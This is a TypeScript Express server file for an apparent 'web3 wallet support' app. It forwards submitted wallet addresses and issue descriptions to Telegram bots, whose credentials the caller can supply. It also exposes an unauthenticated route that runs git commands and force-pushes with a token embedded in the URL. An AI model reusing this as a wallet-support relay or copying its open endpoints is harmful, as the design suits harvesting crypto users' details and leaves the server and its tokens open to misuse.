import type { Express } from "express";
import { createServer, type Server } from "http";
import { exec } from "child_process";
import { promisify } from "util";
import { storage } from "./storage";

const execAsync = promisify(exec);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function getGitHubToken(): Promise<string> {
  const hostname = process.env.REPLIT_CONNECTORS_HOSTNAME;
  const xReplitToken = process.env.REPL_IDENTITY
    ? "repl " + process.env.REPL_IDENTITY
    : process.env.WEB_REPL_RENEWAL
      ? "depl " + process.env.WEB_REPL_RENEWAL
      : null;

  if (!xReplitToken || !hostname) {
    throw new Error("GitHub not connected");
  }

  const response = await fetch(
    `https://${hostname}/api/v2/connection?include_secrets=true&connector_names=github`,
    {
      headers: {
        Accept: "application/json",
        X_REPLIT_TOKEN: xReplitToken,
      },
    }
  );

  const data = await response.json();
  const connectionSettings = data.items?.[0];
  const accessToken =
    connectionSettings?.settings?.access_token ||
    connectionSettings?.settings?.oauth?.credentials?.access_token;

  if (!accessToken) {
    throw new Error("Failed to get GitHub access token");
  }

  return accessToken;
}

async function sendTelegramMessage(message: string, token?: string, chatId?: string): Promise<boolean> {
  const botToken = token || TELEGRAM_BOT_TOKEN;
  const teleChatId = chatId || TELEGRAM_CHAT_ID;

  if (!botToken || !teleChatId) {
    console.warn("Telegram credentials not configured");
    return false;
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: teleChatId,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    return response.ok;
  } catch (error) {
    console.error("Error sending Telegram message:", error);
    return false;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Submit crypto issue and send to Telegram
  app.post("/api/submit-issue", async (req, res) => {
    try {
      const { walletAddress, issueType, issueDescription, telegramConfigs } = req.body;

      // Validate required fields
      if (!issueType || !issueDescription) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      // Format message for Telegram
      const telegramMessage = `
<b>🚨 New Crypto Issue Submitted</b>

<b>Wallet Address:</b> ${walletAddress || "Not provided"}
<b>Issue Type:</b> ${issueType}

<b>Description:</b>
${issueDescription}

<i>Submitted at: ${new Date().toLocaleString()}</i>
`;

      // Send to all Telegram configs
      let successCount = 0;
      if (telegramConfigs && Array.isArray(telegramConfigs)) {
        for (const config of telegramConfigs) {
          const sent = await sendTelegramMessage(telegramMessage, config.token, config.chatId);
          if (sent) successCount++;
        }
      } else {
        // Fallback to single channel if no configs provided
        const sent = await sendTelegramMessage(telegramMessage);
        if (sent) successCount = 1;
      }

      res.json({ success: true, message: "Issue submitted successfully", successCount });
    } catch (error) {
      console.error("Error processing issue submission:", error);
      res.status(500).json({ error: "Failed to process submission" });
    }
  });

  // Push code to GitHub
  app.post("/api/push-github", async (req, res) => {
    try {
      console.log("Starting GitHub push...");
      
      // Configure git user
      await execAsync("git config --global user.email 'replit@example.com'");
      await execAsync("git config --global user.name 'Replit User'");
      console.log("Git config set");
      
      // Get current branch
      const { stdout: branch } = await execAsync("git rev-parse --abbrev-ref HEAD");
      const currentBranch = branch.trim();
      console.log("Current branch:", currentBranch);

      // Add all changes
      await execAsync("git add -A");
      console.log("Files staged");

      // Check if there are changes to commit
      const { stdout: status } = await execAsync("git status --porcelain");
      
      if (status.trim()) {
        // Commit changes
        const timestamp = new Date().toISOString();
        await execAsync(`git commit -m "Auto-push from Replit: ${timestamp}"`);
        console.log("Changes committed");
      } else {
        console.log("No changes to commit");
      }

      // Get GitHub token from integration
      const token = await getGitHubToken();
      console.log("GitHub token obtained");

      // Push to GitHub with authentication
      const repoUrl = `https://${token}@github.com/file-stack/web3-wallet-support.git`;
      await execAsync(`git push ${repoUrl} ${currentBranch} --force 2>&1 | grep -v "password"`);
      
      console.log("Push successful!");
      res.json({ 
        success: true, 
        message: `Code pushed to GitHub on branch '${currentBranch}'`,
        branch: currentBranch
      });
    } catch (error) {
      console.error("GitHub push error:", error);
      res.status(500).json({ 
        error: "Failed to push to GitHub",
        details: error instanceof Error ? error.message : "Unknown error"
      });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
